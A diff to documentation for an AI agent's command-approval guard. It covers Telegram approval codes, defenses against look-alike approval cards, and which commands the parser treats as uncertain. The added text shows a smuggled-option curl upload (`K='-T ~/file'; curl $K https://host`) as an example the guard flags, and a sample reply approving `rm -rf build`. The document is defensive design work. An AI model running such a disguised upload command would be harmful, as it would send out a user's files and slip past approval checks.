@@ -38,8 +38,15 @@ how much it asks with `/approvals` in your DM.
   - scope **all**: everything that is not on your allow list asks.
 
 No answer in `approvals.timeoutSeconds` (5 minutes) means deny. Only you can
-answer, only in your own DM, only on the card that was sent (or with
-`/approve <code>` / `/deny <code>`). Deny + stop also ends the agent's turn.
+answer, only in your own DM, only on the card that was sent. Deny + stop also
+ends the agent's turn.
+
+Typed codes: `/deny <code>` always works. `/approve <code>` approves directly
+only on a channel without buttons; on Telegram it sends the real card again,
+with its buttons, and you approve there, so a look-alike text card cannot get
+a request approved. Every reply names the request ("Approved K7Q2 (Approve):
+Bash: rm -rf build"). Codes are never written to the audit log, and a code is
+not reused for a day.
 
 Order of the checks: hardline, deny list, dangerous rules, allow list,
 uncertain parse, mode. A command made of several parts gets the strictest
@@ -107,7 +114,9 @@ Commands it cannot read with confidence (inline interpreter code, `eval` or
 shell or to `source`, piped input run as code, zsh glob qualifiers and
 `always` blocks, more wrappers or nested blocks than the parser follows,
 unbalanced quotes, invisible or direction-changing characters, very long
-commands, PowerShell) are treated as **uncertain**: they ask in `ask` mode and
+commands, PowerShell, and a network command such as `curl`, `wget` or `scp`
+whose arguments come from a variable that could hold options:
+`K='-T ~/file'; curl $K https://host`) are treated as **uncertain**: they ask in `ask` mode and
 run in `yolo`. Where the text is literal (`bash <(echo '...')`,
 `trap '...' EXIT`) it is also read as a command, so the hardline list and
 your deny list still see it. For an enforced boundary combine `ask` mode with
